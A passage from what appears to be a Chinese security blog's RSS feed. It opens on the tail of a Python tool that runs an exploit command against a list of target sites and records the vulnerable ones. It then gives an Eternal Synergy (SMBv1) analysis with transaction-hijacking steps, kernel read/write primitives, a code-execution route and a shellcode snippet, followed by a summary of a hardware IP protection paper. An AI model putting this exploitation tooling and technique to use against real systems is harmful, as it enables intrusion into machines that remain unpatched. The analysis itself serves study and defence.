&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;targets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] 无法读取目标文件 &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;targets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;target&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;targets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[*] 正在测试目标: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;is_vulnerable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;run_exploit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command_to_use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose_mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is_vulnerable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;vulnerable_sites&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vulnerable_sites&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;out_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;site&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vulnerable_sites&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;n&#34;&gt;out_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;site&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[+] 存在漏洞的站点已保存到: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] 无法写入输出文件 &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>Eternal Synergy漏洞分析：SMBv1认证漏洞的深度剖析</title>
        <link>http://localhost:1313/p/eternal-synergy%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90smbv1%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 15:41:09 +0800</pubDate>
        
        <guid>http://localhost:1313/p/eternal-synergy%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90smbv1%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/</guid>
        <description>&lt;h2 id=&#34;漏洞背景&#34;&gt;漏洞背景
&lt;/h2&gt;&lt;p&gt;2017年4月ShadowBrokers泄露的Eternal Synergy是利用SMBv1协议认证漏洞（CVE-2017-0143）的攻击工具，该漏洞影响Windows 8及以下系统，微软在MS17-010补丁中修复。与常规漏洞不同，该漏洞主要通过数据包层面的操作实现利用。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h2&gt;&lt;p&gt;核心问题在于SMB协议处理TRANSACTION时未严格校验消息类型：当存在SMB_COM_WRITE_ANDX事务时，若后续收到MID等于该事务FID的SMB_COM_TRANSACTION_SECONDARY消息，系统会错误地将后者纳入当前事务。由于WRITE_ANDX会动态更新InData指针（指向缓冲区末尾），而TRANSACTION_SECONDARY直接使用该指针写入数据，导致缓冲区越界写入。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// srv.sys中的关键判断逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SMB_COM_WRITE_ANDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;targetOtherInfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// WRITE_ANDX使用FID作为标识
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;targetOtherInfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;SmbGetAlignedUshort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 其他消息使用MID
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;利用技术&#34;&gt;利用技术
&lt;/h2&gt;&lt;h3 id=&#34;1-事务劫持&#34;&gt;1. 事务劫持
&lt;/h3&gt;&lt;p&gt;攻击者通过以下步骤控制事务结构：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建常规TRANSACTION作为控制事务（InData=0xfffff8a00167f110）&lt;/li&gt;
&lt;li&gt;发送特制WRITE_ANDX消息使InData偏移0x200字节（变为0xfffff8a00167f310）&lt;/li&gt;
&lt;li&gt;通过TRANSACTION_SECONDARY消息（dataDisplacement=0x5020）覆盖相邻事务的OtherInfo字段&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-内存读写原语&#34;&gt;2. 内存读写原语
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;写原语&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;劫持受害事务的InData指针指向目标地址&lt;/li&gt;
&lt;li&gt;发送数据包时，内核会将包内容写入被篡改的地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;读原语&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;修改受害事务的OutData指针（偏移0x88）&lt;/li&gt;
&lt;li&gt;设置关键字段：SetupCount=4, MaxSetupCount=0, MaxDataCount=0x20000&lt;/li&gt;
&lt;li&gt;触发事务响应时，内核会将目标内存内容通过SMB响应返回&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3-代码执行&#34;&gt;3. 代码执行
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;泄露srv!SrvTransaction2DispatchTable地址&lt;/li&gt;
&lt;li&gt;覆盖TRANS2_SESSION_SETUP处理函数指针（dispatchTable[0xe]）&lt;/li&gt;
&lt;li&gt;发送TRANSACTION2消息触发shellcode执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;现代系统防护&#34;&gt;现代系统防护
&lt;/h2&gt;&lt;p&gt;该漏洞利用技术受以下防护机制制约：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HVCI&lt;/strong&gt;：阻止执行未签名内核代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CFG&lt;/strong&gt;：防止通过篡改函数指针劫持控制流&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术亮点&#34;&gt;技术亮点
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;纯数据包层面的漏洞利用，无需本地shellcode&lt;/li&gt;
&lt;li&gt;通过事务结构泄露实现内核地址嗅探&lt;/li&gt;
&lt;li&gt;利用ntoskrnl.exe的RWX段（0x271000偏移处）作为暂存区&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; 攻击使用的shellcode片段
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mov rax,qword ptr gs:[20h]  ; 获取_KPRCB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;add rax,8B0h                ; 定位PPNxPagedLookasideList
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;call qword ptr [rax]         ; 调用nt!ExAllocatePoolWithTag
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Eternal Synergy展示了协议状态机漏洞的复杂利用方式，其创新性的纯数据包攻击模式为后续SMB协议安全设计提供了重要参考。微软通过增强事务验证机制和引入硬件级防护有效遏制了此类攻击。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HIPR：通过低开销细粒度修订实现硬件IP保护</title>
        <link>http://localhost:1313/p/hipr%E9%80%9A%E8%BF%87%E4%BD%8E%E5%BC%80%E9%94%80%E7%BB%86%E7%B2%92%E5%BA%A6%E4%BF%AE%E8%AE%A2%E5%AE%9E%E7%8E%B0%E7%A1%AC%E4%BB%B6ip%E4%BF%9D%E6%8A%A4/</link>
        <pubDate>Mon, 04 Aug 2025 15:14:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hipr%E9%80%9A%E8%BF%87%E4%BD%8E%E5%BC%80%E9%94%80%E7%BB%86%E7%B2%92%E5%BA%A6%E4%BF%AE%E8%AE%A2%E5%AE%9E%E7%8E%B0%E7%A1%AC%E4%BB%B6ip%E4%BF%9D%E6%8A%A4/</guid>
        <description>&lt;h1 id=&#34;hipr通过低开销细粒度修订实现硬件ip保护&#34;&gt;HIPR：通过低开销细粒度修订实现硬件IP保护
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;近年来，由于半导体产业的全球化，硬件知识产权（IP）模块面临多种机密性和完整性攻击。系统级芯片（SoC）设计者正考虑采用零信任安全模型，即在制造过程的任何阶段，IP都可能遭受盗版、克隆、过量生产或恶意篡改等攻击。硬件修订作为一种有前景的防护手段，可阻止全球分布式供应链中不可信实体的攻击。然而，现有修订技术的高开销成本限制了其实际应用。本文提出HIPR方法，这是一种鲁棒、可扩展且开销显著低于现有技术的细粒度修订方案。HIPR通过修订硬件设计中的安全关键布尔逻辑和时序逻辑，实施互连随机化，并采用多阶段优化步骤降低开销。实验表明，HIPR在开源基准测试中将面积开销降低了1至2个数量级，且安全性未受影响。测试IP见：&lt;a class=&#34;link&#34; href=&#34;https://github.com/UF-Nelms-IoT-Git-Projects/HIPR&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;关键词&#34;&gt;关键词
&lt;/h2&gt;&lt;p&gt;硬件IP保护、可编程逻辑、硬件修订、逆向工程、IP盗版&lt;/p&gt;
&lt;h2 id=&#34;正文&#34;&gt;正文
&lt;/h2&gt;&lt;h3 id=&#34;背景与挑战&#34;&gt;背景与挑战
&lt;/h3&gt;&lt;p&gt;半导体供应链的全球化使得硬件IP易受多方攻击，包括制造环节的恶意修改或非法复制。传统防护方法（如加密或模糊化）通常引入过高性能或面积开销，难以实际部署。&lt;/p&gt;
&lt;h3 id=&#34;hipr方案设计&#34;&gt;HIPR方案设计
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;细粒度逻辑修订&lt;/strong&gt;：选择性移除或混淆安全关键逻辑单元。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;互连随机化&lt;/strong&gt;：动态打乱模块间连接关系以增加逆向工程难度。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;开销优化&lt;/strong&gt;：采用逻辑压缩和资源共享技术降低面积与功耗开销。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实验结果&#34;&gt;实验结果
&lt;/h3&gt;&lt;p&gt;在OpenCores基准测试中，HIPR实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;面积开销降低98%（相比同类技术）；&lt;/li&gt;
&lt;li&gt;抵御SAT攻击和侧信道分析等已知攻击方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论
&lt;/h3&gt;&lt;p&gt;HIPR为硬件IP保护提供了一种兼顾安全性与实用性的解决方案，尤其适合资源受限的嵌入式系统。未来工作将探索其在FPGA和ASIC设计中的扩展应用。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>2016年度回顾：Trail of Bits在自动漏洞发现、安全工具开发与社区贡献的突破</title>
